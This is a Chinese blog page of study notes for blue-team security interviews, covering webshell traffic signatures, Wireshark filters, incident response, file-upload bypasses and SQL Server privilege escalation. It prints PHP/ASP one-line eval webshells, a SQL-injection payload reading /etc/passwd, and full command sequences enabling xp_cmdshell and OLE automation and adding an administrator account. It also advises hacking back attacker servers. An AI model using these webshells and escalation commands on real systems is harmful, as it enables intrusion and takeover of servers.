<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Hvv面试题目（蓝初）流量特征https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53577336&#x2F;article&#x2F;details&#x2F;125048353 菜刀流量特征常见一句话(Eval)： php一句话:1&lt;?php @eval($_POST[&amp;#x27;caidao&amp;#x27;]);?&gt;  ASP一句话:1&lt;%eval request(&quot;caidao&quot;)%&amp;g">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2023/06/14/%E9%9D%A2%E8%AF%95/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Hvv面试题目（蓝初）流量特征https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53577336&#x2F;article&#x2F;details&#x2F;125048353 菜刀流量特征常见一句话(Eval)： php一句话:1&lt;?php @eval($_POST[&amp;#x27;caidao&amp;#x27;]);?&gt;  ASP一句话:1&lt;%eval request(&quot;caidao&quot;)%&amp;g">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-06-14T08:32:00.693Z">
<meta property="article:modified_time" content="2023-05-15T10:20:45.573Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-面试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/06/14/%E9%9D%A2%E8%AF%95/" class="article-date">
  <time class="dt-published" datetime="2023-06-14T08:32:00.693Z" itemprop="datePublished">2023-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Hvv面试题目（蓝初）"><a href="#Hvv面试题目（蓝初）" class="headerlink" title="Hvv面试题目（蓝初）"></a>Hvv面试题目（蓝初）</h1><h2 id="流量特征"><a href="#流量特征" class="headerlink" title="流量特征"></a>流量特征</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53577336/article/details/125048353">https://blog.csdn.net/qq_53577336/article/details/125048353</a></p>
<h3 id="菜刀流量特征"><a href="#菜刀流量特征" class="headerlink" title="菜刀流量特征"></a>菜刀流量特征</h3><p>常见一句话(Eval)：</p>
<h4 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话:"></a>php一句话:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="ASP一句话"><a href="#ASP一句话" class="headerlink" title="ASP一句话:"></a>ASP一句话:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval request(&quot;caidao&quot;)%&gt;</span><br></pre></td></tr></table></figure>

<p>数据包末尾<strong>i&#x3D;A&amp;z0&#x3D;GB2312</strong></p>
<h4 id="asp-net一句话"><a href="#asp-net一句话" class="headerlink" title="asp.net一句话:"></a>asp.net一句话:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;caidao&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1：”Execute”Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数； </p>
<p>2：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。</p>
<p>3：Response.Write和Response.End是必有的，是来完善整个操作的。</p>
</blockquote>
<p>请求体中传递的payload为base64编码，并且存在固定的为</p>
<blockquote>
<p>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p>
</blockquote>
<p>unicode编码</p>
<h3 id="中国蚁剑流量特征"><a href="#中国蚁剑流量特征" class="headerlink" title="中国蚁剑流量特征"></a>中国蚁剑流量特征</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>每个请求体都存在 <code>@ini_set(“display_errors”, “0”);@set_time_limit(0)</code> 开头，并且存在 base64_decode 等字符。</p>
<h4 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h4><p>OnError ResumeNext、Response.End、Response.Write</p>
<p><strong>Ex”&amp;cHr(101)&amp;”cute</strong></p>
<p>参数名大多以：”_0x……&#x3D;”这种形式</p>
<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br></pre></td></tr></table></figure>

<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（ClassLoader，getClass().getClassLoader())//jsp</span><br></pre></td></tr></table></figure>

<blockquote>
<p>所有请求中Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>所有请求中Cookie中后面都存在 ; （分号）<br>所有响应中Cache-Control: no-store, no-cache, must-revalidate,</p>
</blockquote>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（AND 1=1 UNION ALL SELECT 1,NULL,&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;,table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell(&#x27;cat ../../../etc/passwd&#x27;)#）</span><br></pre></td></tr></table></figure>

<ul>
<li>数组</li>
<li>报错特征</li>
<li>@@version_compile_os特征</li>
<li>测试命令执行语句特征</li>
<li>调用系统命令特征</li>
</ul>
<h4 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h4><p>assert、system、proc_open、shell_exec、passthru、popen、exec</p>
<p>eval</p>
<h3 id="流量分析-wireshark"><a href="#流量分析-wireshark" class="headerlink" title="流量分析(wireshark)"></a>流量分析(wireshark)</h3><ul>
<li><p>过滤ip:</p>
</li>
<li><ul>
<li>过滤源ip地址:<code>ip.src==1.1.1.1</code>; 过滤目的ip地址: <code>ip.dst==1.1.1.1</code></li>
</ul>
</li>
<li><p>过端口:</p>
</li>
<li><ul>
<li>过滤80端口：<code>tcp.port==80</code>，源端口：<code>tcp.srcport=80</code>，目的端口：<code>tcp.dsttport==80</code></li>
</ul>
</li>
<li><p>协议过滤:</p>
</li>
<li><ul>
<li>直接输入协议名即可，http or https</li>
</ul>
</li>
<li><p>http模式过滤:</p>
</li>
<li><ul>
<li>过滤 get&#x2F;post包 http.request.mothod&#x3D;&#x3D;”GET&#x2F;POST”</li>
</ul>
</li>
</ul>
<h2 id="溯源思路（需要修改）"><a href="#溯源思路（需要修改）" class="headerlink" title="溯源思路（需要修改）"></a>溯源思路（需要修改）</h2><p>溯源思路：首先通过系统日志、安全设备截获攻击包等从中分析出攻击者的ip和攻击方式，通过webshell或者木马去微步分析，或者去安恒威胁情报中心进行ip检测分析，是不是云服务器，基站等，如果是云服务器的话可以直接反渗透，看看开放端口，域名，whois等进行判断，获取姓名电话等丢社工库看看能不能找到更多信息然后收工</p>
<h2 id="应急思路（需要修改）"><a href="#应急思路（需要修改）" class="headerlink" title="应急思路（需要修改）"></a>应急思路（需要修改）</h2><p>首先通过安全设备拦截攻击包体和日志分析，了解攻击者具体进行了什么样的攻击，通过黑白结合模拟方法进一步判断攻击者的攻击方式。复现之后对漏洞进行修复，对攻击者进行溯源。</p>
<h3 id="内存马排查"><a href="#内存马排查" class="headerlink" title="内存马排查"></a>内存马排查</h3><p>先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。</p>
<p>如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p>
<p>查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。</p>
<p>通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。<br>————————————————<br>版权声明：本文为CSDN博主「[l_l]」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SimoSimoSimo/article/details/127700190">https://blog.csdn.net/SimoSimoSimo/article/details/127700190</a></p>
<h2 id="网络服务器容器"><a href="#网络服务器容器" class="headerlink" title="网络服务器容器"></a>网络服务器容器</h2><p>IIS、Apache、nginx、Lighttpd、Tomcat</p>
<ul>
<li>IIS 6.0—— &#x2F;xx.asp&#x2F;xx.jpg</li>
<li>IIS 7.0—— 默认Fast-cgi开启，直接在图片地址后面输入&#x2F;.php就会将图片当做php解析</li>
<li>Nginx——版本小于0.8.37 利用方法和IIS7.0一样</li>
<li>Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断</li>
<li>Lighttpd—— XX.jpg&#x2F;xx.php</li>
</ul>
<h3 id="OWASP-TOP10"><a href="#OWASP-TOP10" class="headerlink" title="OWASP TOP10"></a>OWASP TOP10</h3><p> SQL注入<br> 失效的身份认证<br> 敏感数据泄露<br> XML外部实体（XXE）<br> 失效的访问控制<br> 安全配置错误<br> 跨站脚本（XSS）<br> 不安全的反序列化<br> 使用含有已知漏洞的组件<br> 不足的日志记录和监控</p>
<h3 id="判断框架"><a href="#判断框架" class="headerlink" title="判断框架"></a>判断框架</h3><p>如何手工识别一个网站是struct2框架</p>
<blockquote>
<ol>
<li>通过页面回显的错误消息来判断，页面不回显错误消息时则无效。</li>
<li>通过网页后缀来判断，如.do，.action，有可能不准。</li>
<li>判断 &#x2F;struts&#x2F;webconsole.html 是否存在来进行判断，需要 devMode 为 true。</li>
</ol>
<p>大佬自己的方法（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/greencollar/p/14119662.html%EF%BC%89%EF%BC%9A">https://www.cnblogs.com/greencollar/p/14119662.html）：</a></p>
<p>方法一：通过 actionErrors。此方法最早应该是由 kxlzx 在好些年前提出来的。要求是对应的 Action 需要继承自 ActionSupport 类。</p>
<p>利用方法：如原始 URL 为 <a target="_blank" rel="noopener" href="https://threathunter.org/%E5%88%99%E6%A3%80%E6%B5%8B%E6%89%80%E7%94%A8%E7%9A%84">https://threathunter.org/则检测所用的</a> URL 为 <a target="_blank" rel="noopener" href="https://threathunter.org/?actionErrors=1111">https://threathunter.org/?actionErrors=1111</a></p>
<p>如果返回的页面出现异常，则可以认定为目标是基于 Struts2 构建的。异常包括但不限于以下几种现象：</p>
<ol>
<li>页面直接出现 404 或者 500 等错误</li>
<li>页面上输出了与业务有关错误消息，或者 1111 被回显到了页面上</li>
<li>页面的内容结构发生了明显的改变</li>
<li>页面发生了重定向</li>
</ol>
<p>方法二：通过 CheckboxInterceptor。这是我在调试 Struts2 的过程中找到的方法。本来是想找到一个 100% 通杀的办法的，结果没有找到。</p>
<p>要求：需要有一个能够回显到页面上的字符串类型的参数。我目前碰到的最多的地方就是各个目标的搜索功能。搜索功能往往会将 keyword 回显到页面上。</p>
<p>此拦截器本意是配合 HTML 中的 checkbox 来使用的，当某个参数没有被提交的时候，则认定这个 checkbox 没有被选中。</p>
</blockquote>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><blockquote>
<p>20 21ftp21端口是用于控制 数据传输看情况</p>
<p>22 ssh</p>
<p>23 telnet</p>
<p>25 SMTP</p>
<p>53 DNS</p>
<p>80 web</p>
<p>110 POP3 电子邮件</p>
<p>995 POP3连接</p>
<p>135 RPC</p>
<p>143 IMAP服务接收邮件</p>
<p>389 LDAP轻量目录访问</p>
<p>443 https</p>
<p>1433 SQLserver</p>
<p>3306 数据库</p>
<p>3389 远程桌面连接</p>
<p>6379 redis</p>
<p>7001:weblogic</p>
</blockquote>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="shiro反序列化原理"><a href="#shiro反序列化原理" class="headerlink" title="shiro反序列化原理"></a>shiro反序列化原理</h3><p>AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞</p>
<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p>下面我们来说一下sql注入原理，以使读者对sql注入攻击有一个感性的认识，至于其他攻击，原理是一致的。</p>
<p>   SQL注射能使攻击者绕过认证机制，完全控制远程服务器上的数据库。 SQL是结构化查询语言的简称，它是访问数据库的事实标准。目前，大多数Web应用都使用SQL数据库来存放应用程序的数据。几乎所有的Web应用在后台 都使用某种SQL数据库。跟大多数语言一样，SQL语法允许数据库命令和用户数据混杂在一起的。如果开发人员不细心的话，用户数据就有可能被解释成命令， 这样的话，远程用户就不仅能向Web应用输入数据，而且还可以在数据库上执行任意命令了。</p>
<h3 id="SQL注入防护方法"><a href="#SQL注入防护方法" class="headerlink" title="SQL注入防护方法"></a>SQL注入防护方法</h3><ul>
<li>使用安全的Api</li>
<li>对输入的特殊字符进行escape转义处理</li>
<li>使用白名单来规范化输入验证方法</li>
<li>对客户端输入进行控制，不允许输入SQL注入相关的特殊字符</li>
<li>服务器端在提交数据库进行SQL注入查询之前，对特殊字符进行过滤，转义，替换，删除</li>
<li>预编译</li>
<li>防火墙（不在代码层面）waf</li>
</ul>
<h3 id="SSRF和CSRF的区别"><a href="#SSRF和CSRF的区别" class="headerlink" title="SSRF和CSRF的区别"></a>SSRF和CSRF的区别</h3><p>SSRF作用于服务端，CSRF作用于客户端</p>
<h3 id="SSRF配合哪个协议去攻击Redis"><a href="#SSRF配合哪个协议去攻击Redis" class="headerlink" title="SSRF配合哪个协议去攻击Redis"></a>SSRF配合哪个协议去攻击Redis</h3><p>Gopher</p>
<h3 id="文件上传绕过思路"><a href="#文件上传绕过思路" class="headerlink" title="文件上传绕过思路"></a>文件上传绕过思路</h3><blockquote>
<p>前端js绕过</p>
<p>黑白名单绕过，如果可以上传phtml php3 php4 php5 Php php (空格) php.，pphphp</p>
<p>针对文件类型绕过，content-type字段</p>
<p>win系统解析漏洞绕过</p>
<p>1、上传1.php(或者图片马)，抓包改为1.php.</p>
<p>2、上传1.php(或者图片马)，抓包改为1.php::$DATA</p>
<p>3、上传1.php(或者图片马)，抓包改为1.php:1.jpg</p>
<p>4、上传1.php(或者图片马)，抓包改为1.php::$DATA…….</p>
<p>配合.htaccess、.user.ini</p>
</blockquote>
<h2 id="内网（蓝中）"><a href="#内网（蓝中）" class="headerlink" title="内网（蓝中）"></a>内网（蓝中）</h2><h3 id="SQLServer提权"><a href="#SQLServer提权" class="headerlink" title="SQLServer提权"></a>SQLServer提权</h3><h5 id="使用xp-cmdshell进行提权"><a href="#使用xp-cmdshell进行提权" class="headerlink" title="使用xp_cmdshell进行提权"></a>使用xp_cmdshell进行提权</h5><blockquote>
<p><strong>假设条件：</strong><br>1、已得到 sql server 的sa权限<br>2、sql server开启外联</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">使用sql server的客户端连接数据库</span><br><span class="line">sql sever有一个自带的系统数据库master，而xp_cmdshell在 存储过程、扩展存储过程中</span><br><span class="line"></span><br><span class="line">查看扩展存储过程，如果其中含有 sys.xp_cmdshell 说明目标网站没有删除该组件，只是默认把该组件禁止，如果没有看到该组件说明已删除xp_cmdshell，那么可以上传dll文件进行删除，其中dll文件要根据sql server 数据库版本进行选择</span><br><span class="line"></span><br><span class="line">选择数据库后，再进行新建查询</span><br><span class="line"></span><br><span class="line">执行&quot;EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;&quot;命令后，报错提示 xp_cmdshell 被关闭</span><br><span class="line"></span><br><span class="line">那么就使用开启 xp_cmdshell 的命令（只有sa权限才可以开启）</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">开启 xp_cmdshell 之后，再次执行 EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27; 命令，成功提权到system权限。</span><br><span class="line"></span><br><span class="line">##简单总结</span><br><span class="line">xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。</span><br><span class="line"></span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;</span><br><span class="line">reconfigure;</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;命令&#x27;</span><br><span class="line"></span><br><span class="line">如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复</span><br><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="使用sp-oacreate进行提权"><a href="#使用sp-oacreate进行提权" class="headerlink" title="使用sp_oacreate进行提权"></a>使用sp_oacreate进行提权</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br><span class="line">执行命令后，报错提示 sp_oacreate组件 被关闭</span><br><span class="line"></span><br><span class="line">那么就使用开启 xp_cmdshell 的命令（只有sa权限才可以开启）</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line"></span><br><span class="line">开启之后，whoami查看权限</span><br><span class="line"></span><br><span class="line">##总结</span><br><span class="line">启用：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line"></span><br><span class="line">关闭：</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 0;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\1.txt&#x27;</span><br><span class="line"></span><br><span class="line">以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。</span><br></pre></td></tr></table></figure>

<h6 id="使用SQL-Server-沙盒提权"><a href="#使用SQL-Server-沙盒提权" class="headerlink" title="使用SQL Server 沙盒提权"></a>使用SQL Server 沙盒提权</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">执行添加管理员的命令后，报错：SQL Server阻止了对组件&#x27;Ad Hoc Distributed Queries&#x27;的…………</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">那么输入以下命令，启用Ad Hoc Distributed Queries：</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;</span><br><span class="line">reconfigure;</span><br><span class="line"></span><br><span class="line">再执行</span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;</span><br><span class="line"></span><br><span class="line">执行添加一个管理员 margin 命令</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">将margin用户提升到超级管理员权限</span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">net localgroup administrators 查看超级管理员组账户有margin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##简单总结</span><br><span class="line">--提权语句</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;</span><br><span class="line"></span><br><span class="line">-- 不开启的话在执行xp_regwrite会提示让我们开启，</span><br><span class="line"></span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;reconfigure;</span><br><span class="line"></span><br><span class="line">--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</span><br><span class="line"></span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br><span class="line"></span><br><span class="line">--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;, &#x27;SandBoxMode&#x27;</span><br><span class="line"></span><br><span class="line">--执行系统命令select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">select * from openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net localgroup administrators margin /add&quot;)&#x27;)</span><br><span class="line"></span><br><span class="line">沙盒模式SandBoxMode参数含义（默认是2）</span><br><span class="line"></span><br><span class="line">`0`：在任何所有者中禁止启用安全模式</span><br><span class="line"></span><br><span class="line">`1` ：为仅在允许范围内</span><br><span class="line"></span><br><span class="line">`2` ：必须在access模式下</span><br><span class="line"></span><br><span class="line">`3`：完全开启</span><br><span class="line"></span><br><span class="line">openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。</span><br><span class="line"></span><br><span class="line">--恢复配置</span><br><span class="line"></span><br><span class="line">--exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line"></span><br><span class="line">--exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line"></span><br><span class="line">--exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40412037/article/details/112858836">https://blog.csdn.net/weixin_40412037/article/details/112858836</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/06/14/%E9%9D%A2%E8%AF%95/" data-id="clivgek0100004wtogyutclvy" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
